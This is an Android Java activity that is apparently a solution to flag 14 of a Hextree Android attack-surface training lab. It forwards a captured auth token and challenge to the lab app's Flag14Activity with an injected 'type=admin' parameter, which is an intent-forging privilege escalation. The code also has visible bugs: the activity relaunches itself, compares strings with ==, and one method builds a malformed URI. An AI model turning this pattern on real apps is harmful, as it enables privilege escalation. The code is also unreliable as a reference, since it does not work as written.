package com.android.zerohextree;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityExploitFlag14Binding;

public class ExploitFlag14 extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Step 1: Trigger Flag14Activity to generate a challenge
        Intent triggerIntent = new Intent(this, ExploitFlag14.class);
        startActivity(triggerIntent);

        // Step 2: Wait for the challenge to be generated (simulate delay)
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            // Step 3: Extract the challenge (requires SharedPreferences access)
            String challenge = extractChallengeFromTargetApp();

            // Step 4: Craft and send the malicious intent
            sendExploitIntent();
            finish();
        }, 2000); // Adjust delay based on app behavior
    }

    private String extractChallengeFromTargetApp() {
        // This requires the target app's SharedPreferences to be world-readable.
        // For demonstration, hardcode the challenge if you know it.
        return "CAPTURED_UUID"; // Replace with actual captured UUID
    }

    private void sendExploitIntent() {
        Intent receivedIntent = getIntent();
        if (receivedIntent.getAction() == "android.intent.action.VIEW") {
            Uri data = receivedIntent.getData();
            Log.d("queryParameters", String.valueOf(data));
            String authToken = data.getQueryParameter("authToken");
            String authChallenge = data.getQueryParameter("authChallenge");

            Intent sendIntent = new Intent();
            sendIntent.setAction("android.intent.action.VIEW");
            sendIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity");
            sendIntent.setData(Uri.parse("hex://token?authToken=" + authToken + "&type=admin&authChallenge=" + authChallenge));
            startActivity(sendIntent);
        }
    }
    private void exx(){
        Intent recieved_intent= getIntent();
        if(recieved_intent.getAction().equals("android.intent.action.VIEW")){
            Uri data =recieved_intent.getData();
            String auttoken= data.getQueryParameter("authToken");
            String authcha =data.getQueryParameter("authChallenge");

            Intent melodious_Intent =new Intent();
            melodious_Intent.setAction("android.intent.action.VIEW");
            melodious_Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity");
            melodious_Intent.setData(Uri.parse("hex://token?authToken"+auttoken+"&type=admin&authChallenge=" + authcha));
            startActivity(melodious_Intent);

        }
    }
    }